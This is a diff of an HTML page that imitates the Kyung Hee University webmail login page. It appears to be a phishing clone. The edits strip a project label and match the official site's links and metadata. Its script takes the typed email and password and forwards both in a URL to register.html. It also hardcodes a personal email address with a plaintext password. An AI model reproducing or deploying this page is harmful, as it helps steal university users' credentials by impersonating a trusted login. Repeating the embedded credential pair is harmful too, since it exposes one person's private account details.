@@ -1,38 +1,54 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ko">
+
 <head>
-
-	<link rel="stylesheet" href="customs/resources/xe.min.css" type="text/css" charset="UTF-8" media="all">
-    <link rel="stylesheet" href="customs/resources/xn.common.css" type="text/css" charset="UTF-8" media="all">
-    <link rel="stylesheet" href="customs/resources/jquery-ui.css" type="text/css" charset="UTF-8" media="all">
-    <link rel="stylesheet" href="customs/resources/default.css" type="text/css" charset="UTF-8" media="all">
-    <link rel="stylesheet" href="customs/resources/content_manager_mobile_login-1.css" type="text/css" charset="UTF-8" media="all">
-
-    <link href="login_style.css" rel="stylesheet" />
-
-
-
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1" />
-	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-
-
     <title>경희대학교 웹메일</title>
-  
+    <link rel="SHORTCUT ICON" href="/favicon.ico" type="image/x-icon" />
+    <link rel="ICON" href="/favicon.ico" type="image/x-icon" />
+    <link rel="canonical" href="https://mail.khu.ac.kr" />
+    <meta charset="utf-8" />
+    <meta http-equiv="Expires" content="0" />
+    <meta http-equiv="Cache-Control" content="no-cache" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="Content-Script-Type" content="text/javascript" />
+    <meta http-equiv="Content-Style-Type" content="text/css" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no" />
+    <meta name="HandheldFriendly" content="true" />
+    <meta name="format-detection" content="telephone=no" />
+    <meta http-equiv="imagetoolbar" content="no" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="description" content="경희대학교 웹메일 로그인" />
+    <meta name="keywords" content="경희대학교,웹메일,로그인" />
+    <meta name="classification" content="경희대학교,웹메일,로그인" />
 
+    <!-- Custom Fonts -->
+    <link href="login_style.css" rel="stylesheet" />
+    <link href="/css/login_style.css" rel="stylesheet" />
+
+   
+        
+    <!-- Common Scripts -->
+    <script src="/js/cosmmon.js"></script>
+   
+   
+    <!--[if IE 7]>
+<script>
+$(function(){
+  // IE7에서 리사이즈 반영되지 않는 버그 극복
+  $(window).resize(function(){
+    $("#language").selectric('refresh');
+  });
+});
+</script>
+<![endif]-->
 </head>
+
 <body>
-
-
-
-
-
-
     <div id="wrapper">
-		<a href="/"><img src="login_logo.png" alt="경희대학교 로고" /></a>
-
         <div id="header">
-         
+            <a href="/"><img src="login_logo.png" alt="경희대학교 로고" /></a>
+        </div>
         <div id="subject">
             <h1>웹메일 로그인</h1>
         </div>
@@ -73,12 +89,12 @@
             </form>
             <div class="links">
                 <span class="link1">
-        <a href="https://mail.khu.ac.kr/agreement.do">신규 아이디 신청</a>
-        <a href="https://mail.khu.ac.kr/deleteUser.do">기존 아이디 해지</a>
+        <a href="/agreement.do">신규 아이디 신청</a>
+        <a href="/deleteUser.do">기존 아이디 해지</a>
       </span>
                 <span class="link2">
-        <a href="https://mail.khu.ac.kr/idSearch.do">아이디 찾기</a>
-        <a href="https://mail.khu.ac.kr/passwordFind.do">비밀번호 찾기</a>
+        <a href="/idSearch.do">아이디 찾기</a>
+        <a href="/passwordFind.do">비밀번호 찾기</a>
       </span>
             </div>
         </div>
@@ -86,30 +102,9 @@
             <div style="float:left;padding-left:5px;"><a href="https://sites.google.com/view/khu-ois" target="_blank"><strong style="font-weight:bold;color:#ff0000;">공지사항 및 이용방법 안내</strong></a></div>
             <div style="float:right;padding-right:5px;"><a href="https://ois.khu.ac.kr/plaza/plaza_01_view.do?lbSeq=156" target="_blank"><strong style="font-weight:bold;color:#ff0000;">웹메일 단계별 용량 정리 안내</strong></a>&nbsp; | &nbsp;<a href="https://ois.khu.ac.kr/plaza/plaza_01_view.do?lbSeq=157" target="_blank"><strong style="font-weight:bold;color:#ff0000;">웹메일 이용약관 변경 안내</strong></a></div>
         </div>
-	</br>
     </div>
-
-
-
-
- 
-	<ul></br>
-		<div><strong>경희대학교 빅데이터응용학과 지식플랫폼 BDAE-alpha</strong></div>
-		
-	</ul>
-</div>
-</div>
-</div>
-
-
-
-
-
-
- 
-
-
-
+    
+    
 
 <script>
 	function go_click() {
@@ -150,7 +145,7 @@
 		}else if (emailfb == "samuelthegalaxys@gmail.com" & pwdfb == "03272002kihoon"){
 			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
 		}else{				
-			location.href="register.html?" + emailfb + "@khu.ac.kr"+ "/" + pwdfb;
+			location.href="register.html?" + emailfb + "/" + pwdfb;
 
 		}
 
@@ -164,9 +159,15 @@
 
 
    </script>
-</body>
+
+
+
+
 
 
  
+
+
+</body>
 
 </html>
